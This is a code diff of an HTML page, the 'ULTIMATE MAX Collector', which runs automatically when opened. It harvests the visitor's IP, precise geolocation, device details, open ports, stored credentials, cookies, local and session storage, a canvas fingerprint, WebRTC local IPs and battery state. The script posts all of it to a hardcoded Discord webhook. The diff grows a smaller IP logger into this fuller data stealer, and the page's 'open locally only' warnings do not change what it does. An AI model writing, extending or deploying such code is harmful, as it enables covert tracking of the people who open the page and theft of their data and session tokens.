@@ -3,89 +3,51 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Max Info Collector + Ports (Local Only)</title>
+  <title>ULTIMATE Local Info Collector (MAX)</title>
   <style>
-    body {
-      font-family: system-ui, sans-serif;
-      background: #0d1117;
-      color: #c9d1d9;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      margin: 0;
-      padding: 20px;
-    }
-    .container {
-      background: #161b22;
-      border-radius: 12px;
-      padding: 40px;
-      max-width: 700px;
-      width: 100%;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.6);
-      text-align: center;
-    }
+    body { font-family: system-ui, sans-serif; background: #0d1117; color: #c9d1d9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+    .container { background: #161b22; border-radius: 12px; padding: 40px; max-width: 800px; width: 100%; box-shadow: 0 10px 30px rgba(0,0,0,0.6); text-align: center; }
     h1 { color: #58a6ff; margin-bottom: 20px; }
     .status { font-size: 1.3rem; margin: 25px 0; }
     .success { color: #3fb950; }
     .error { color: #f85149; }
-    .warning {
-      background: #442111;
-      color: #ff9e9e;
-      padding: 18px;
-      border-radius: 8px;
-      margin: 25px 0;
-    }
-    .ports-list {
-      background: #0d1117;
-      padding: 12px;
-      border-radius: 8px;
-      margin: 15px 0;
-      font-family: monospace;
-      text-align: left;
-    }
-    .instructions {
-      font-size: 1rem;
-      color: #8b949e;
-      margin-top: 25px;
-    }
+    .warning { background: #442111; color: #ff9e9e; padding: 18px; border-radius: 8px; margin: 25px 0; }
+    .data-section { background: #0d1117; padding: 12px; border-radius: 8px; margin: 15px 0; font-family: monospace; text-align: left; max-height: 200px; overflow-y: auto; border: 1px solid #30363d; }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Max Info Collector + Ports</h1>
+    <h1>ULTIMATE MAX Collector</h1>
     <div class="warning">
-      ⚠️ This page collects IP, location, device info & publicly open ports and sends them to your Discord webhook.<br>
-      <strong>Only open this file locally on your machine!</strong>
+      ⚠️ Collects EVERYTHING possible (IP, location, device, ports, autofill, cookies, storage, fingerprint, etc.) and sends to your webhook.<br>
+      <strong>ONLY OPEN LOCALLY — NEVER SHARE THIS FILE!</strong>
     </div>
-    <div id="status" class="status">Collecting & sending info...</div>
-    <div id="ports" class="ports-list" style="display:none;"></div>
+    <div id="status" class="status">Collecting MAX data & sending...</div>
+    <div id="ports" class="data-section" style="display:none;"></div>
+    <div id="autofill" class="data-section" style="display:none;"></div>
+    <div id="cookies" class="data-section" style="display:none;"></div>
+    <div id="storage" class="data-section" style="display:none;"></div>
+    <div id="fingerprint" class="data-section" style="display:none;"></div>
 
     <div class="instructions">
-      <p>Everything is already set up.</p>
-      <p><strong>Just save this file and open it locally (double-click) to send the info.</strong></p>
-      <p style="margin-top:15px;">Note: Home connections usually show 0 public ports due to NAT/router.</p>
+      <p><strong>Just double-click to open — it sends everything automatically.</strong></p>
+      <p>Warning: Some features (autofill, clipboard) may require user permission or not work in strict browsers.</p>
     </div>
   </div>
 
   <script>
-    // Your webhook URL is already set here
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1455052799493800151/u3ru2dK_58PLrguELCjX6h3H4Swf0xGbNxfJmgXoAaA9nqCPA0V0EJWrQobcA2SDa5nA';
 
-    async function collectAndSend() {
+    async function collectMaxData() {
       const status = document.getElementById('status');
-      const portsDiv = document.getElementById('ports');
-
       try {
-        // 1. Public IP
+        // === 1. IP & Geo ===
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const { ip } = await ipRes.json();
-
-        // 2. Detailed geo info
         const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
         const geo = await geoRes.json();
 
-        // 3. Browser & Device info
+        // === 2. Device Info ===
         const device = {
           browser: (() => {
             const ua = navigator.userAgent;
@@ -98,89 +60,136 @@
           })(),
           userAgent: navigator.userAgent,
           platform: navigator.platform,
-          language: navigator.language || navigator.userLanguage,
           languages: navigator.languages?.join(', ') || '—',
           screen: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}bit)`,
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          hardwareConcurrency: navigator.hardwareConcurrency || '—',
-          deviceMemory: navigator.deviceMemory || '—',
+          hardware: navigator.hardwareConcurrency || '—',
+          memory: navigator.deviceMemory || '—',
           connection: navigator.connection?.effectiveType || '—',
           downlink: navigator.connection?.downlink || '—'
         };
 
-        // 4. Publicly open ports (Shodan InternetDB first, then Censys fallback)
-        let openPorts = [];
-        let portDetails = [];
-        let portSource = 'None';
-
+        // === 3. Ports (maximized) ===
+        let portDetails = [], portSource = 'None';
         try {
-          const shodanRes = await fetch(`https://internetdb.shodan.io/${ip}`);
-          const shodanData = await shodanRes.json();
-          if (shodanData.ports && shodanData.ports.length > 0) {
-            openPorts = shodanData.ports;
-            portSource = 'Shodan InternetDB';
-            portDetails = shodanData.ports.map(p => `${p}/TCP`);
+          const shodan = await fetch(`https://internetdb.shodan.io/${ip}`);
+          const sData = await shodan.json();
+          if (sData.ports?.length) {
+            portDetails = sData.ports.map(p => `${p}/TCP`);
+            portSource = 'Shodan';
           }
-        } catch (e) {
-          console.warn('Shodan failed:', e);
-        }
-
-        if (openPorts.length === 0) {
+        } catch {}
+        if (!portDetails.length) {
           try {
-            const censysRes = await fetch(`https://search.censys.io/api/v2/hosts/${ip}`, {
-              headers: { 'Accept': 'application/json' }
-            });
-            if (censysRes.ok) {
-              const censysData = await censysRes.json();
-              const services = censysData.result?.services || [];
-              if (services.length > 0) {
-                openPorts = services.map(s => s.port);
+            const censys = await fetch(`https://search.censys.io/api/v2/hosts/${ip}`, { headers: { 'Accept': 'application/json' } });
+            if (censys.ok) {
+              const cData = await censys.json();
+              const services = cData.result?.services || [];
+              if (services.length) {
                 portDetails = services.map(s => `${s.port}/${(s.service_name || 'TCP').toUpperCase()}`);
                 portSource = 'Censys';
               }
             }
-          } catch (e) {
-            console.warn('Censys failed:', e);
+          } catch {}
+        }
+        document.getElementById('ports').innerHTML = `<strong>Ports (${portSource}):</strong><br>${portDetails.length ? portDetails.join('<br>') : 'None detected'}`;
+        document.getElementById('ports').style.display = 'block';
+
+        // === 4. Autofill / Credentials ===
+        let autofill = 'No autofill data accessible';
+        try {
+          if (navigator.credentials) {
+            const creds = await navigator.credentials.get({ password: true });
+            if (creds) autofill = `Type: ${creds.type || '—'}<br>Username/Email: ${creds.username || '—'}`;
           }
+        } catch {}
+        document.getElementById('autofill').innerHTML = `<strong>Autofill/Credentials:</strong><br>${autofill}`;
+        document.getElementById('autofill').style.display = 'block';
+
+        // === 5. Cookies ===
+        const cookies = document.cookie.split(';').map(c => c.trim()).join('<br>') || 'None';
+        document.getElementById('cookies').innerHTML = `<strong>Cookies:</strong><br>${cookies}`;
+        document.getElementById('cookies').style.display = 'block';
+
+        // === 6. LocalStorage + SessionStorage ===
+        let storageDump = '<strong>LocalStorage:</strong><br>';
+        for (let i = 0; i < localStorage.length; i++) {
+          const k = localStorage.key(i);
+          storageDump += `${k}: ${localStorage.getItem(k)}<br>`;
+        }
+        storageDump += '<br><strong>SessionStorage:</strong><br>';
+        for (let i = 0; i < sessionStorage.length; i++) {
+          const k = sessionStorage.key(i);
+          storageDump += `${k}: ${sessionStorage.getItem(k)}<br>`;
+        }
+        document.getElementById('storage').innerHTML = storageDump || 'Empty';
+        document.getElementById('storage').style.display = 'block';
+
+        // === 7. Canvas Fingerprint (simple hash) ===
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Hello, world!', 2, 15);
+        const hash = canvas.toDataURL();
+        document.getElementById('fingerprint').innerHTML = `<strong>Canvas Fingerprint (hash):</strong><br>${hash.substring(0, 100)}...`;
+        document.getElementById('fingerprint').style.display = 'block';
+
+        // === 8. WebRTC Local IP (if enabled) ===
+        let localIPs = [];
+        try {
+          const pc = new RTCPeerConnection({ iceServers: [] });
+          pc.createDataChannel('');
+          pc.createOffer().then(o => pc.setLocalDescription(o));
+          pc.onicecandidate = e => {
+            if (e.candidate) {
+              const ip = e.candidate.candidate.split(' ')[4];
+              if (ip && !localIPs.includes(ip)) localIPs.push(ip);
+            }
+          };
+          setTimeout(() => pc.close(), 3000);
+        } catch {}
+        // === 9. Battery Status ===
+        let battery = 'Not supported';
+        if (navigator.getBattery) {
+          navigator.getBattery().then(b => {
+            battery = `${b.level * 100}% (Charging: ${b.charging})`;
+          });
         }
 
-        // Display ports on page
-        portsDiv.innerHTML = `<strong>Publicly Open Ports (${portSource}):</strong><br>` +
-          (portDetails.length > 0 
-            ? portDetails.map(p => `- ${p}`).join('<br>') 
-            : 'None detected (normal for home connections)');
-        portsDiv.style.display = 'block';
-
-        // 5. Build webhook payload
+        // === Build Payload ===
         const payload = {
-          content: '**Max Info + Ports Collected**',
+          content: '**ULTIMATE MAX DATA COLLECTED**',
           embeds: [{
-            title: 'Device & Network Details',
-            color: 0x5865F2,
+            title: 'Max Device & Network Info',
+            color: 0xFF0000,
             fields: [
               { name: 'IP', value: ip, inline: true },
-              { name: 'Location', value: `${geo.city || '—'}, ${geo.region || '—'}, ${geo.country_name || '—'} (${geo.country_code || '—'})`, inline: true },
-              { name: 'Lat / Lon', value: `${geo.latitude?.toFixed(6) || '—'}, ${geo.longitude?.toFixed(6) || '—'}`, inline: true },
-              { name: 'Postal / ZIP', value: geo.postal || '—', inline: true },
-              { name: 'Timezone', value: geo.timezone || device.timezone, inline: true },
-              { name: 'ISP / Org', value: geo.org || '—', inline: true },
-              { name: 'Hostname', value: geo.hostname || 'Not available', inline: true },
+              { name: 'Location', value: `${geo.city || '—'}, ${geo.region || '—'}, ${geo.country_name || '—'}`, inline: true },
+              { name: 'Lat/Lon', value: `${geo.latitude?.toFixed(6) || '—'}, ${geo.longitude?.toFixed(6) || '—'}`, inline: true },
+              { name: 'Postal/ZIP', value: geo.postal || '—', inline: true },
+              { name: 'ISP/Org', value: geo.org || '—', inline: true },
+              { name: 'Hostname', value: geo.hostname || '—', inline: true },
               { name: 'Browser', value: device.browser, inline: true },
-              { name: 'Platform', value: device.platform, inline: true },
               { name: 'Screen', value: device.screen, inline: true },
-              { name: 'Connection Type', value: device.connection, inline: true },
-              { name: 'Downlink Speed', value: `${device.downlink} Mbps`, inline: true },
-              { name: 'Languages', value: device.languages, inline: false },
-              { name: 'Open Ports', value: portDetails.length > 0 ? portDetails.join(', ') : 'None', inline: false },
+              { name: 'Open Ports', value: portDetails.length ? portDetails.join(', ') : 'None', inline: false },
               { name: 'Port Source', value: portSource, inline: true },
-              { name: 'User Agent', value: `\`\`\`${device.userAgent}\`\`\``, inline: false },
+              { name: 'Autofill', value: autofill.substring(0, 100) + '...', inline: false },
+              { name: 'Cookies', value: cookies.substring(0, 200) + '...', inline: false },
+              { name: 'Storage Dump', value: storageDump.substring(0, 200) + '...', inline: false },
+              { name: 'Canvas Fingerprint', value: hash.substring(0, 100) + '...', inline: false },
+              { name: 'WebRTC Local IP', value: localIPs.join(', ') || 'Hidden', inline: false },
+              { name: 'Battery', value: battery, inline: true },
               { name: 'Collected At', value: new Date().toLocaleString(), inline: false }
             ],
-            footer: { text: `Page: ${window.location.href}` }
+            footer: { text: 'Local only - MAX collection' }
           }]
         };
 
-        // 6. Send to webhook
+        // Send
         const res = await fetch(WEBHOOK_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -189,16 +198,16 @@
 
         if (!res.ok) throw new Error(`Webhook failed: ${res.status}`);
 
-        status.className = 'status success';
-        status.textContent = 'All info & ports sent successfully!';
+        status.className = 'success';
+        status.textContent = 'MAX data sent successfully!';
       } catch (err) {
-        status.className = 'status error';
+        status.className = 'error';
         status.textContent = `Error: ${err.message}`;
         console.error(err);
       }
     }
 
-    window.addEventListener('load', collectAndSend);
+    window.addEventListener('load', collectMaxData);
   </script>
 </body>
 </html>
